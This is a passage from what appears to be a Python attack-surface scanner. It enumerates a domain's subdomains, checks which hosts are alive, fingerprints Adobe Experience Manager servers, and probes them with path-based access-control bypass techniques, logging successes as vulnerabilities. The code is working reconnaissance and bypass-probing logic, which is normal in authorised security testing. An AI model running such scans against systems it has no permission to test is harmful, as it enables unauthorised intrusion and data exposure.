                        try:
                            proc.kill()
                        except Exception:
                            pass
                tlsx_wd = threading.Thread(target=_tlsx_watchdog, daemon=True)
                tlsx_wd.start()

                # Cap at 500 hosts — each one requires a TLS handshake, 2000+ is too slow
                san_sample = scan.subdomains[:500]
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"TLS SAN: probing {len(san_sample)} hosts (max {tlsx_timeout}s)..."})
                proc.stdin.write("\n".join(san_sample))
                proc.stdin.close()
                for line in proc.stdout:
                    if scan.cancelled or tlsx_killed:
                        proc.kill()
                        break
                    line = line.strip().strip("[]")
                    for name in line.split(","):
                        name = name.strip()
                        if name and name.endswith(d):
                            _add_sub(name, "tls-san")
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"TLS SAN: +{count - tls_before} new (total: {count})"})
            except Exception as e:
                log.warning("tlsx SAN extraction error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 12: CNAME pattern discovery
    # Check CNAME records of discovered subdomains. If multiple subs
    # point to the same CNAME target (e.g. adobe-aem.map.fastly.net),
    # search for MORE subs with that same CNAME pattern.
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled and scan.subdomains:
        dnsx_bin = os.path.expanduser("~/.pdtm/go/bin/dnsx")
        if not os.path.isfile(dnsx_bin):
            dnsx_bin = "/usr/local/bin/dnsx"
        if os.path.isfile(dnsx_bin):
            try:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "CNAME pattern analysis: resolving discovered subdomains..."})
                cname_before = count
                # Run dnsx to get CNAME records for a sample of discovered subdomains
                cname_timeout = 60
                sample = scan.subdomains[:300]
                proc = subprocess.Popen(
                    [dnsx_bin, "-silent", "-cname", "-resp-only"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                )

                # Watchdog for dnsx
                dnsx_killed = False
                def _dnsx_watchdog():
                    nonlocal dnsx_killed
                    time.sleep(cname_timeout)
                    if proc.poll() is None:
                        dnsx_killed = True
                        try:
                            proc.kill()
                        except Exception:
                            pass
                dnsx_wd = threading.Thread(target=_dnsx_watchdog, daemon=True)
                dnsx_wd.start()

                proc.stdin.write("\n".join(sample))
                proc.stdin.close()
                cname_targets = set()
                for line in proc.stdout:
                    if dnsx_killed:
                        break
                    cname = line.strip().rstrip(".")
                    if cname:
                        cname_targets.add(cname)
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()

                # Log interesting CNAME patterns (AEM, CDN, cloud providers)
                aem_cnames = [c for c in cname_targets if any(
                    p in c.lower() for p in ["aem", "adobe", "akamai", "fastly", "cloudfront", "azure"]
                )]
                if aem_cnames:
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"CNAME patterns: {', '.join(aem_cnames[:5])}"})

                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"CNAME analysis: {len(cname_targets)} unique targets found"})
            except Exception as e:
                log.warning("CNAME analysis error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 13: DNS wordlist resolution (dnsx)
    # Passive APIs fail for massive domains (crt.sh 502, CertSpotter
    # pagination, URLScan limits). DNS resolution is the ONLY reliable
    # method — if a subdomain resolves, it exists. Period.
    # Uses a 679-word focused wordlist + dnsx to resolve in ~10 seconds.
    # This is how quantum.microsoft.com gets found — it resolves to
    # 151.101.107.10 (Fastly / AEM Cloud).
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        dnsx_bin = os.path.expanduser("~/.pdtm/go/bin/dnsx")
        if not os.path.isfile(dnsx_bin):
            dnsx_bin = "/usr/local/bin/dnsx"
        wordlist_path = os.path.join(os.path.dirname(__file__), "dns-wordlist.txt")
        if os.path.isfile(dnsx_bin) and os.path.isfile(wordlist_path):
            try:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "DNS wordlist resolution: probing common prefixes..."})
                log.info("SOURCE 13: Starting DNS wordlist resolution with dnsx")
                dns_before = count

                # Read wordlist and generate full domain names
                with open(wordlist_path) as wf:
                    prefixes = [line.strip() for line in wf if line.strip() and not line.startswith("#")]

                dns_timeout = 60
                proc = subprocess.Popen(
                    [dnsx_bin, "-silent"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                )

                # Watchdog to kill dnsx if it hangs
                dns_wl_killed = False
                def _dns_wl_watchdog():
                    nonlocal dns_wl_killed
                    time.sleep(dns_timeout)
                    if proc.poll() is None:
                        dns_wl_killed = True
                        try:
                            proc.kill()
                        except Exception:
                            pass
                dns_wl_wd = threading.Thread(target=_dns_wl_watchdog, daemon=True)
                dns_wl_wd.start()

                # Feed prefixed domains to dnsx
                domains_to_check = "\n".join(f"{p}.{d}" for p in prefixes)
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"DNS wordlist: resolving {len(prefixes)} prefixes (max {dns_timeout}s)..."})
                proc.stdin.write(domains_to_check)
                proc.stdin.close()

                for line in proc.stdout:
                    if scan.cancelled or dns_wl_killed:
                        proc.kill()
                        break
                    resolved = line.strip()
                    if resolved and resolved.endswith(d):
                        _add_sub(resolved, "dns-wordlist")

                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()

                added = count - dns_before
                if dns_wl_killed:
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"DNS wordlist: timed out after {dns_timeout}s, found +{added} (total: {count})"})
                else:
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"DNS wordlist: +{added} new (total: {count})"})
                log.info("SOURCE 13: DNS wordlist done, +%d new subdomains", added)
            except FileNotFoundError:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "DNS wordlist: dnsx not found, skipping"})
            except Exception as e:
                log.warning("DNS wordlist error: %s", e)
        else:
            if not os.path.isfile(dnsx_bin):
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "DNS wordlist: dnsx not installed, skipping"})
            if not os.path.isfile(wordlist_path):
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "DNS wordlist: wordlist file not found, skipping"})

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 14: CertSpotter API (Certificate Transparency)
    # Independent from crt.sh — paginated to get deeper coverage.
    # Free tier: 100 certs/page. We fetch up to 10 pages = 1000 certs.
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        try:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": "Querying CertSpotter (Certificate Transparency)..."})
            cs_before = count
            cs_after = None
            cs_max_pages = 10
            for cs_page in range(cs_max_pages):
                if scan.cancelled:
                    break
                cs_url = (
                    f"https://api.certspotter.com/v1/issuances"
                    f"?domain={d}&include_subdomains=true&expand=dns_names"
                )
                if cs_after:
                    cs_url += f"&after={cs_after}"
                try:
                    r = requests.get(cs_url, timeout=20, headers={"User-Agent": "Mozilla/5.0"})
                    if r.status_code == 429:
                        _send_ws(scan, {"type": "log", "level": "info",
                                        "message": f"CertSpotter: rate limited on page {cs_page+1}, stopping"})
                        break
                    if r.status_code != 200 or not r.content:
                        break
                    certs = r.json()
                    if not isinstance(certs, list) or not certs:
                        break
                    for cert in certs:
                        for name in cert.get("dns_names", []):
                            name = name.strip().lstrip("*.")
                            if name and name.endswith(d):
                                _add_sub(name, "certspotter")
                    cs_after = certs[-1].get("id")
                    if not cs_after:
                        break
                except requests.exceptions.Timeout:
                    continue
                except Exception:
                    break
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"CertSpotter ({cs_page+1} pages): +{count - cs_before} new (total: {count})"})
        except Exception as e:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"CertSpotter: failed ({type(e).__name__})"})
            log.warning("CertSpotter error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 15: URLScan.io API (crowd-sourced URL scanning)
    # Returns recently-scanned subdomains. Paginated with search_after.
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        try:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": "Querying URLScan.io..."})
            us_before = count
            us_url = f"https://urlscan.io/api/v1/search/?q=domain:{d}&size=100"
            r = requests.get(us_url, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200 and r.content:
                us_data = r.json()
                for result in us_data.get("results", []):
                    if scan.cancelled:
                        break
                    page_domain = result.get("page", {}).get("domain", "")
                    if page_domain and page_domain.endswith(d):
                        _add_sub(page_domain, "urlscan")
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"URLScan.io: +{count - us_before} new (total: {count})"})
        except Exception as e:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"URLScan.io: failed ({type(e).__name__})"})
            log.warning("URLScan.io error: %s", e)

    # Deduplicate final list
    scan.subdomains = list(dict.fromkeys(scan.subdomains))

    _send_ws(scan, {
        "type": "progress",
        "phase": 1,
        "current": len(scan.subdomains),
        "total": len(scan.subdomains),
        "message": f"Enumeration complete: {len(scan.subdomains)} unique subdomains",
    })
    _send_ws(scan, {
        "type": "phase",
        "phase": 1,
        "name": "Subdomain Enumeration",
        "status": "complete",
        "count": len(scan.subdomains),
    })
    log.info("Phase 1 complete: %d subdomains", len(scan.subdomains))


# ============================================================================
# PHASE 2: ALIVE CHECK
# ============================================================================
def phase2_alive(scan: ScanState) -> None:
    """Run httpx to filter alive hosts."""
    targets = scan.subdomains if scan.subdomains else scan.urls
    if not targets:
        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "skipped",
            "message": "No targets to probe",
        })
        return

    _send_ws(scan, {
        "type": "phase",
        "phase": 2,
        "name": "Alive Check",
        "status": "running",
    })
    scan.phase = ScanPhase.ALIVE

    log.info("Phase 2: Probing %d targets for alive hosts", len(targets))

    httpx_bin = find_go_httpx()
    if not httpx_bin:
        log.warning("httpx not found, normalizing URLs directly")
        _send_ws(scan, {
            "type": "progress",
            "phase": 2,
            "current": 0,
            "total": len(targets),
            "message": "httpx not found — using raw URLs (no alive filtering)",
        })
        scan.alive_hosts = [u for u in (normalize_url(t) for t in targets) if u]
        for host in scan.alive_hosts:
            _send_ws(scan, {
                "type": "host_found",
                "phase": 2,
                "host": host,
                "status": "assumed_alive",
            })
        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "complete",
            "count": len(scan.alive_hosts),
        })
        return

    log.info("Using httpx binary: %s", httpx_bin)

    # ── Batched parallel alive check for 100K+ targets ──
    # Split targets into batches and run multiple httpx processes
    # concurrently for massive speed improvement.
    total_targets = len(targets)
    BATCH_SIZE = 5000                   # hosts per httpx process
    HTTPX_THREADS = 200                 # threads inside each httpx
    HTTPX_TIMEOUT_PER_HOST = 5          # seconds per host connection
    MAX_CONCURRENT_BATCHES = 4          # parallel httpx processes
    BATCH_WATCHDOG_TIMEOUT = 180        # kill a batch after 3 min

    batches = [targets[i:i + BATCH_SIZE] for i in range(0, total_targets, BATCH_SIZE)]
    total_batches = len(batches)

    log.info("Phase 2: %d targets → %d batches of %d, %d concurrent, %d threads each",
             total_targets, total_batches, BATCH_SIZE, MAX_CONCURRENT_BATCHES, HTTPX_THREADS)
    _send_ws(scan, {"type": "log", "level": "info",
                    "message": f"Alive check: {total_targets} targets → {total_batches} batches, {MAX_CONCURRENT_BATCHES} parallel, {HTTPX_THREADS} threads each"})

    checked_count = 0           # total hosts checked so far
    alive_count = 0             # total alive found
    checked_lock = threading.Lock()

    def _run_batch(batch_idx: int, batch_hosts: list[str]) -> list[str]:
        """Run httpx on one batch and return alive URLs."""
        nonlocal checked_count, alive_count
        alive = []
        try:
            proc = subprocess.Popen(
                [httpx_bin, "-silent", "-no-color",
                 "-threads", str(HTTPX_THREADS),
                 "-timeout", str(HTTPX_TIMEOUT_PER_HOST),
                 "-rate-limit", "500"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
            )

            # Watchdog for this batch
            batch_killed = False
            def _batch_wd():
                nonlocal batch_killed
                time.sleep(BATCH_WATCHDOG_TIMEOUT)
                if proc.poll() is None:
                    batch_killed = True
                    try:
                        proc.kill()
                    except Exception:
                        pass
            wd = threading.Thread(target=_batch_wd, daemon=True)
            wd.start()

            proc.stdin.write("\n".join(batch_hosts))
            proc.stdin.close()

            for line in proc.stdout:
                if scan.cancelled:
                    proc.kill()
                    return alive
                if batch_killed:
                    break
                line = line.strip()
                if not line:
                    continue
                url = line.split(" ")[0].strip()
                if url and url.startswith(("http://", "https://")):
                    alive.append(url)
                    with checked_lock:
                        alive_count += 1
                        scan.alive_hosts.append(url)
                    _send_ws(scan, {
                        "type": "host_found",
                        "phase": 2,
                        "host": url,
                        "status": "alive",
                    })

            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            # Update progress after batch completes
            with checked_lock:
                checked_count += len(batch_hosts)
                current_checked = checked_count
                current_alive = alive_count

            pct = int(current_checked / total_targets * 100)
            _send_ws(scan, {
                "type": "progress",
                "phase": 2,
                "current": current_alive,
                "total": total_targets,
                "message": f"Checked {current_checked}/{total_targets} ({pct}%) — {current_alive} alive",
            })
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"Batch {batch_idx+1}/{total_batches}: checked {len(batch_hosts)}, +{len(alive)} alive — total: {current_checked}/{total_targets} ({pct}%)"})

            if batch_killed:
                log.info("Batch %d killed by watchdog after %ds", batch_idx+1, BATCH_WATCHDOG_TIMEOUT)

        except FileNotFoundError:
            log.warning("httpx not found in batch %d", batch_idx+1)
        except Exception as e:
            log.warning("Batch %d error: %s", batch_idx+1, e)
        return alive

    try:
        # Run batches with thread pool for concurrency
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=MAX_CONCURRENT_BATCHES) as pool:
            futures = {
                pool.submit(_run_batch, i, batch): i
                for i, batch in enumerate(batches)
            }
            for future in as_completed(futures):
                if scan.cancelled:
                    pool.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    future.result()
                except Exception as e:
                    log.warning("Batch future error: %s", e)

        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "complete",
            "count": len(scan.alive_hosts),
        })
        log.info("Phase 2 complete: %d alive hosts out of %d checked", len(scan.alive_hosts), total_targets)

    except Exception as e:
        log.warning("Phase 2 batch executor error: %s", e)
        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "complete",
            "count": len(scan.alive_hosts),
            "message": f"Completed with errors: {e}",
        })
    except Exception as e:
        log.error("httpx error: %s", e)
        scan.alive_hosts = [u for u in (normalize_url(t) for t in targets) if u]
        _send_ws(scan, {
            "type": "phase",
            "phase": 2,
            "name": "Alive Check",
            "status": "complete",
            "count": len(scan.alive_hosts),
            "message": f"httpx error ({e}); using unfiltered list",
        })


# ============================================================================
# PHASE 3: AEM DETECTION (multi-signal fingerprinting)
# ============================================================================
def detect_aem_host(
    base_url: str, scan: ScanState, timeout: int = DEFAULT_TIMEOUT
) -> tuple[str, int, list[str]]:
    """
    Probe a single host with multi-method AEM fingerprinting.

    Methods:
      A: Source code / HTML analysis (+5 each)
      B: Response headers (+4 each)
      C: Path fingerprinting (+3 each)
      D: AEM-specific content patterns (+5 each)
      E: JavaScript console objects (+3 each)
      F: Sample content check (+5 each)

    Returns: (confidence, score, reasons)
    """
    score = 0
    reasons: list[str] = []
    seen_headers: set[str] = set()
    homepage_body = ""

    # Track helix-rum-js presence (checked later for Edge Delivery classification)
    _has_helix_rum = False

    # ─── STEP 1: Fetch homepage FIRST (strongest signal, before WAF triggers) ───
    # WAFs like Akamai can start blocking after seeing suspicious AEM paths,
    # so we fetch the homepage before any probing to ensure we get the HTML.
    try:
        hp = requests.get(
            base_url + "/",
            headers=HEADERS,
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
        if hp.status_code == 200 and len(hp.content) > 100:
            homepage_body = hp.text

            # --- Method A: Homepage HTML analysis (+5 each) ---
            for pattern, reason_tag in HTML_ANALYSIS_PATTERNS:
                if re.search(pattern, homepage_body, re.IGNORECASE):
                    score += 5
                    reasons.append(reason_tag)

            # --- Method B: Response headers on homepage (+4 each) ---
            for hdr in hp.headers:
                h_lo = hdr.lower()
                if h_lo in AEM_DETECT_HEADERS and h_lo not in seen_headers:
                    score += 4
                    reasons.append(f"header:{hdr}")
                    seen_headers.add(h_lo)

            # Check if Server is Apache (weaker signal, only counts with others)
            server_hdr = hp.headers.get("Server", "").lower()
            if "apache" in server_hdr and score > 0:
                score += 2
                reasons.append("header:Server:Apache")

            # Detect helix-rum-js (could be Edge Delivery OR just analytics on AEM)
            if "helix-rum-js" in homepage_body:
                _has_helix_rum = True

    except Exception:
        pass

    # ─── STEP 2: Baseline probes (catch-all detection) ───
    # Hit 2 random nonsense paths. If both return the SAME status code,
    # that status is the "catch-all status" — any AEM path returning
    # that same status is NOT a real AEM signal.
    robots_status = 0
    try:
        rr = requests.get(
            base_url + "/robots.txt",
            headers=HEADERS,
            timeout=6,
            verify=False,
            allow_redirects=False,
        )
        robots_status = rr.status_code
    except Exception:
        pass

    probe_status_1 = 0
    probe_status_2 = 0
    probe_location_1 = ""
    probe_location_2 = ""
    is_catchall = False
    is_blockall = False
    catchall_status: set[int] = set()
    baseline_sizes: list[int] = []
    try:
        r0 = requests.get(
            base_url + "/aem-detect-probe-xyz789-notexist.json",
            headers=HEADERS,
            timeout=7,
            verify=False,
            allow_redirects=False,
        )
        probe_status_1 = r0.status_code
        probe_location_1 = r0.headers.get("Location", "").lower()
        if probe_status_1 == 200:
            baseline_sizes.append(len(r0.content))

        r0b = requests.get(
            base_url + "/probe-rng-aem-detect-zzz456-none.html",
            headers=HEADERS,
            timeout=7,
            verify=False,
            allow_redirects=False,
        )
        probe_status_2 = r0b.status_code
        probe_location_2 = r0b.headers.get("Location", "").lower()
        if probe_status_2 == 200:
            baseline_sizes.append(len(r0b.content))

        # If both probes return the same status, it's a catch-all for that status
        if probe_status_1 == probe_status_2 and probe_status_1 != 0:
            is_catchall = True
            catchall_status.add(probe_status_1)
            # Also treat redirect-to-same-location as catch-all
            if probe_status_1 in (301, 302, 307, 308):
                catchall_status.add(301)
                catchall_status.add(302)
                catchall_status.add(307)
                catchall_status.add(308)

        # Detect block-all (403 on everything)
        is_blockall = (probe_status_1 == 403 and probe_status_2 == 403
                       and robots_status != 200)

        # Check catch-all body for AEM sigs (rare but possible)
        if is_catchall and probe_status_1 == 200 and len(r0.content) > 50:
            body_lower = r0.text.lower()
            for sig in AEM_BODY_SIGS_DETECT:
                if sig.lower() in body_lower:
                    score += 3
                    reasons.append(f"catchall-body:{sig[:22]}")
                    break
    except Exception:
        pass

    # Helper: check if a status matches the catch-all pattern
    def _is_catchall_response(status_code, location=""):
        """Return True if this response matches what the control probe got."""
        if not is_catchall:
            return False
        if status_code in catchall_status:
            return True
        # Redirect to the same location as the control probe
        if (status_code in (301, 302, 307, 308)
                and probe_status_1 in (301, 302, 307, 308)):
            if location and probe_location_1:
                # Same redirect target = catch-all
                if location.rstrip("/") == probe_location_1.rstrip("/"):
                    return True
            return True  # same class of redirect
        # 4xx/5xx matching control probe status exactly (even if not strict catchall)
        if status_code == probe_status_1 == probe_status_2 and status_code != 0:
            return True
        return False

    # --- Method D: AEM body patterns on homepage (+5 each) ---
    if homepage_body:
        body_lower = homepage_body.lower()
        d_patterns = [
            ("jcr:primaryType", "body:jcr:primaryType"),
            ("sling:resourceType", "body:sling:resourceType"),
            ("cq:Page", "body:cq:Page"),
            ("adobe experience manager", "body:adobe-experience-manager"),
            ("j_username", "body:j_username"),
            ("/etc.clientlibs/", "body:/etc.clientlibs/"),
        ]
        for pat, reason_tag in d_patterns:
            if pat.lower() in body_lower:
                score += 5
                reasons.append(reason_tag)

    # --- Method E: JavaScript console objects (+3 each) ---
    if homepage_body:
        for pattern, reason_tag in JS_OBJECT_PATTERNS:
            if re.search(pattern, homepage_body):
                score += 3
                reasons.append(reason_tag)

    # --- Method C: Path fingerprinting ---
    # CRITICAL: Skip scoring if the response matches the catch-all pattern.
    # A real AEM server returns DIFFERENT responses for AEM paths vs random paths.
    # A catch-all returns the SAME response for everything.
    for path, name in AEM_DETECT_PATHS:
        if scan.cancelled:
            break
        try:
            r = requests.get(
                base_url + path,
                headers=HEADERS,
                timeout=7,
                verify=False,
                allow_redirects=False,
            )
            resp_loc = r.headers.get("Location", "").lower()

            # Method B: Response headers on every probe (+4 each)
            # Headers are ALWAYS checked — they're independent of catch-all
            for hdr in r.headers:
                h_lo = hdr.lower()
                if h_lo in AEM_DETECT_HEADERS and h_lo not in seen_headers:
                    score += 4
                    reasons.append(f"header:{hdr}")
                    seen_headers.add(h_lo)

            # ── Skip scoring if this response matches the catch-all ──
            if _is_catchall_response(r.status_code, resp_loc):
                continue  # same as random path → not an AEM signal

            # 403 on AEM-specific paths (not a blanket block)
            if r.status_code == 403 and not is_blockall:
                score += 3
                reasons.append(f"403:{name}")

            # 200 with AEM-specific body content
            elif r.status_code == 200 and len(r.content) > 50:
                # If is_catchall with 200, check body differs from baseline
                if is_catchall and baseline_sizes:
                    if all(abs(len(r.content) - bs) < 200 for bs in baseline_sizes):
                        continue  # same body as random path
                body_lower = r.text.lower()
                waf_block = any(s in body_lower for s in [
                    "request rejected", "access denied", "incapsula",
                    "you have been blocked", "cloudflare ray id"
                ])
                if not waf_block:
                    for sig in AEM_BODY_SIGS_DETECT:
                        if sig.lower() in body_lower:
                            score += 5
                            reasons.append(f"body:{sig[:22]}")
                            break

                    if name == "content-json" and '"jcr:primarytype"' in body_lower:
                        score += 5
                        reasons.append("open-jcr:content.json")

                    if name in ("dam-json", "dam-ext-json", "dam-childrenlist", "dam-www-json") and ("jcr:" in body_lower or "[{" in r.text[:5]):
                        score += 5
                        reasons.append(f"open-dam:{name}")

            # 301/302 redirect — only count if redirect points to AEM-specific login
            if r.status_code in (301, 302) and not is_blockall:
                loc = r.headers.get("Location", "")
                loc_lo = loc.lower()
                # Only score if redirect target is AEM-specific
                if any(aem_sig in loc_lo for aem_sig in [
                    "/libs/granite", "/content/", "login.html",
                    "system/sling/logout", "/crx/"
                ]):
                    score += 3
                    reasons.append(f"auth-redirect:{name}")
                # Generic login/auth/sso redirects get LOW weight and only
                # if redirect target is DIFFERENT from the catch-all target
                elif ("login" in loc_lo or "auth" in loc_lo or "sso" in loc_lo):
                    if not probe_location_1 or loc_lo.rstrip("/") != probe_location_1.rstrip("/"):
                        score += 1
                        reasons.append(f"auth-redirect:{name}")
                # Generic 301 to homepage or same location — NO POINTS
                # (this eliminates the +11 points from catch-all redirectors)

        except Exception:
            pass

    # --- Method F: Sample content check (+5 each) ---
    for path, name in SAMPLE_CONTENT_PATHS:
        if scan.cancelled:
            break
        try:
            r = requests.get(
                base_url + path,
                headers=HEADERS,
                timeout=7,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code == 200 and len(r.content) > 100:
                # Verify it's not a catch-all by checking body
                if not is_catchall or (
                    baseline_sizes
                    and all(abs(len(r.content) - bs) > 200 for bs in baseline_sizes)
                ):
                    score += 5
                    reasons.append(name)
        except Exception:
            pass

    # --- Confidence thresholds ---
    # Edge Delivery Services: has helix-rum-js but NO traditional AEM signals.
    # Traditional AEM sites also embed helix-rum-js for analytics — only flag
    # as Edge Delivery when there are no /etc.clientlibs/ or other strong signals.
    if _has_helix_rum and score < 5:
        reasons.append("edge-delivery:helix-rum-js")
        return "edge_delivery", score, reasons

    if score >= 10:
        return "confirmed", score, reasons
    elif score >= 5:
        return "suspected", score, reasons
    else:
        return "not_aem", score, reasons


def phase3_aem_detect(scan: ScanState) -> None:
    """Parallel AEM fingerprinting across all alive hosts."""
    hosts = scan.alive_hosts
    if not hosts:
        _send_ws(scan, {
            "type": "phase",
            "phase": 3,
            "name": "AEM Detection",
            "status": "skipped",
            "message": "No alive hosts to fingerprint",
        })
        return

    _send_ws(scan, {
        "type": "phase",
        "phase": 3,
        "name": "AEM Detection",
        "status": "running",
    })
    scan.phase = ScanPhase.AEM_DETECT

    log.info("Phase 3: AEM detection on %d hosts", len(hosts))

    done = [0]
    lock = threading.Lock()
    total = len(hosts)

    def _probe(base: str) -> None:
        if scan.cancelled:
            return
        base = base.rstrip("/")
        confidence, score, reasons = detect_aem_host(base, scan, scan.timeout)

        with lock:
            done[0] += 1
            scan.aem_hosts[base] = {
                "confidence": confidence,
                "score": score,
                "reasons": reasons,
            }

        if confidence in ("confirmed", "suspected"):
            _send_ws(scan, {
                "type": "aem_detected",
                "phase": 3,
                "host": base,
                "confidence": confidence,
                "score": score,
                "reasons": reasons,
            })

        _send_ws(scan, {
            "type": "progress",
            "phase": 3,
            "current": done[0],
            "total": total,
            "message": f"Probed {done[0]}/{total} hosts",
        })

    max_w = min(scan.threads, total, 60)
    with ThreadPoolExecutor(max_workers=max_w) as pool:
        futs = [pool.submit(_probe, h) for h in hosts]
        for f in as_completed(futs):
            pass

    confirmed = sum(
        1 for v in scan.aem_hosts.values() if v["confidence"] == "confirmed"
    )
    suspected = sum(
        1 for v in scan.aem_hosts.values() if v["confidence"] == "suspected"
    )
    skipped = sum(
        1 for v in scan.aem_hosts.values() if v["confidence"] == "not_aem"
    )

    _send_ws(scan, {
        "type": "phase",
        "phase": 3,
        "name": "AEM Detection",
        "status": "complete",
        "confirmed": confirmed,
        "suspected": suspected,
        "skipped": skipped,
    })
    log.info(
        "Phase 3 complete: %d confirmed, %d suspected, %d skipped",
        confirmed,
        suspected,
        skipped,
    )


# ============================================================================
# PHASE 4: BYPASS SCAN
# ============================================================================
def _do_bypass_request(
    base_url: str,
    url_path: str,
    tag: str,
    ep_label: str,
    soft404_sizes: list[int],
    host_sem: threading.Semaphore,
    scan: ScanState,
) -> dict[str, Any] | None:
    """Execute a single bypass probe. Returns hit dict or None."""
    full_url = base_url + url_path

    with host_sem:
        for attempt in range(2):
            if scan.cancelled:
                return None
            try:
                resp = requests.get(
                    full_url,
                    headers=HEADERS,
                    timeout=scan.timeout,
                    verify=False,
                    allow_redirects=False,
                )

                if resp.status_code == 429:
                    if attempt == 0:
                        time.sleep(2 + attempt)
                        continue
                    return None

                if resp.status_code != 200:
                    return None

                if not is_real_aem_response(resp, ep_label, soft404_sizes):
                    return None

                size = len(resp.content)
                ctype = resp.headers.get("Content-Type", "")
                return {
                    "host": base_url,
                    "endpoint": ep_label,
                    "endpoint_path": url_path,
                    "bypass": tag,
                    "full_url": full_url,
                    "status_code": 200,
                    "size": size,
                    "content_type": ctype,
                    "genuine": True,
                }

            except (
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectionError,
            ):
                if attempt == 0:
                    time.sleep(0.5)
                continue
            except Exception:
                return None

    return None


def phase4_bypass(scan: ScanState) -> None:
    """Run all bypass techniques against confirmed/suspected AEM hosts."""
    aem_targets = [
        base
        for base, info in scan.aem_hosts.items()
        if info["confidence"] in ("confirmed", "suspected")
    ]

    if not aem_targets:
        _send_ws(scan, {
            "type": "phase",
            "phase": 4,
            "name": "Bypass Scan",
            "status": "skipped",
            "message": "No AEM hosts to bypass-scan",
        })
        return

    _send_ws(scan, {
        "type": "phase",
        "phase": 4,
        "name": "Bypass Scan",
        "status": "running",
    })
    scan.phase = ScanPhase.BYPASS

    log.info("Phase 4: Bypass scan on %d AEM hosts", len(aem_targets))

    # --- Parallel soft-404 baseline probes ---
    host_soft404: dict[str, list[int]] = {}
    with ThreadPoolExecutor(
        max_workers=min(scan.threads, len(aem_targets), 50)
    ) as pp:
        pfuts = {
            pp.submit(get_soft404_baseline, b, scan.timeout): b for b in aem_targets
        }
        for f in as_completed(pfuts):
            base = pfuts[f]
            sizes = f.result()
            host_soft404[base] = sizes
            if sizes:
                _send_ws(scan, {
                    "type": "progress",
                    "phase": 4,
                    "current": 0,
                    "total": 0,
                    "message": f"Soft-404 detected on {base} (baseline {sizes}B) — body-signature filter active",
                })

    # --- Build work items ---
    host_sems = {
        b: threading.Semaphore(scan.per_host) for b in aem_targets
    }
    work: list[tuple[str, str, str, str]] = []
    host_count: dict[str, int] = defaultdict(int)

    for base in aem_targets:
        for ep_path, ep_label in AEM_ENDPOINTS:
            # 8 standard bypass techniques
            bypasses = build_bypass_paths(ep_path)
            for tag, url_path in bypasses:
                work.append((base, url_path, tag, ep_label))
                host_count[base] += 1

            # Technique #9: .ext.json selector bypass
            ext = build_ext_json_path(ep_path)
            if ext:
                tag, url_path = ext
                work.append((base, url_path, tag, ep_label))
                host_count[base] += 1

    total_reqs = len(work)
    done = [0]
    lock = threading.Lock()

    _send_ws(scan, {
        "type": "progress",
        "phase": 4,
        "current": 0,
        "total": total_reqs,
        "message": f"Starting {total_reqs} bypass probes across {len(aem_targets)} AEM hosts",
    })

    host_remaining = dict(host_count)
    host_hits: dict[str, list] = defaultdict(list)
    rem_lock = threading.Lock()

    def _worker(base: str, url_path: str, tag: str, ep_label: str) -> None:
        result = _do_bypass_request(
            base,
            url_path,
            tag,
            ep_label,
            host_soft404.get(base, []),
            host_sems[base],
            scan,
        )

        with lock:
            done[0] += 1
            progress_count = done[0]

        if result:
            scan.vulnerabilities.append(result)
            host_hits[base].append(result)
            _send_ws(scan, {
                "type": "vulnerability",
                "phase": 4,
                "host": result["host"],
                "endpoint": result["endpoint"],
                "bypass": result["bypass"],
                "full_url": result["full_url"],
                "status_code": result["status_code"],
                "size": result["size"],
                "content_type": result["content_type"],
                "genuine": result["genuine"],
            })

        if progress_count % 100 == 0 or progress_count == total_reqs:
